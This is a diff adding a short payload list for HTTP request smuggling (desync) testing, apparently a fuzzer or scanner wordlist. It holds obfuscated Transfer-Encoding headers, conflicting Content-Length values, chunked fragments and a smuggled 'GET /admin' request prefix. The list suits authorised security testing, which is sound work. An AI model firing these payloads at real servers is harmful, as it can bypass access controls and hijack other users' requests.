@@ -1,0 +1,16 @@
+# HTTP request smuggling / desync advanced payloads
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: identity, chunked
+Content-Length: 0
+Content-Length: 4
+Content-Length: 5
+Content-Length: 6
+Content-Length: 0\r\n\r\nG
+0\r\n\r\n
+5\r\nHELLO\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\n\r\n
+GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n
+X-Forwarded-Proto: http
